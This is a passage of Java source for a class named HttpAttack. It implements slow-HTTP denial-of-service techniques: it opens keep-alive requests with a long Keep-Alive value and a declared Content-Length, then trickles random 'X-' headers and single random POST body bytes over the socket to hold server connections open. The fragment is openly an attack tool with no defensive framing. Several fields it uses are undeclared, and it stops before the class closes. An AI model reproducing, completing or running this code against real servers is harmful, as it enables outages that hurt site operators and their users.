import java.io.*;
import java.net.*;
import java.util.*;

public class HttpAttack extends Thread 
{

	private String getRequestHeader()
	{
		String requestHeader = "";
		requestHeader += param.getMethod() + " " + param.getUrl() + " HTTP/1.1\r\n";
		
		requestHeader +="Host: " + param.getHost() + "\r\n"
						+ "User-Agent: " + httpUserAgent + "\r\n"
						+ "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
						+ "Accept-Language: en-us,en;q=0.5\r\n"
						+ "Accept-Encoding: gzip,deflate\r\n"
						+ "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
						
		if (param.getContentLength() > 0) 
		{
			requestHeader += "Connection: keep-alive\r\n";
			requestHeader += "Keep-Alive: 900\r\n";
			requestHeader += "Content-Length: " + param.getContentLength() + "\r\n";
			requestHeader += "\r\n";
		}
		return requestHeader;
	}

	public static byte getRandomByte() 
	{
		int character = gen.nextInt();
		return (byte) character;
	}

	public void sendXHeader() throws IOException
	{
		StringBuffer header1 = new StringBuffer();
		StringBuffer header2 = new StringBuffer();
		int lengthOfXA = param.getRandomLengthOfXA();
		int lengthOfXB = param.getRandomLengthOfXB();
		for (int i=0 ; i<lengthOfXA ; i++) 
		{
			header1.append(Misc.getRandomByte());
		}
		for (int i=0 ; i<lengthOfXB ; i++) 
		{
			header2.append(Misc.getRandomByte());
		}
		socket.getOutputStream().write(("X-" + header1.toString() + ": " + header2.toString() + "\r\n").getBytes());
		socket.getOutputStream().flush();
	}

	public void sendPOSTBodyRandomByte() throws IOException
	{
		socket.getOutputStream().write(Misc.getRandomByte());
		socket.getOutputStream().flush();
	}
	